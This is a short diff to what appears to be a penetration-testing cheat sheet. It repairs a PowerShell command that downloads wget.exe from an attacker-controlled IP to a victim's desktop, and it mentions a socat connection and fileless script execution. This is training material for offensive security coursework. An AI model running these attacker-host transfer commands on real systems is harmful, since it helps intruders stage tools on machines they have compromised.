@@ -50,8 +50,7 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 * PowerShell File Transfers
 
 ```
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
-/10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 ```
 
 Download and run powershell script without saving it to the victim hard disk.
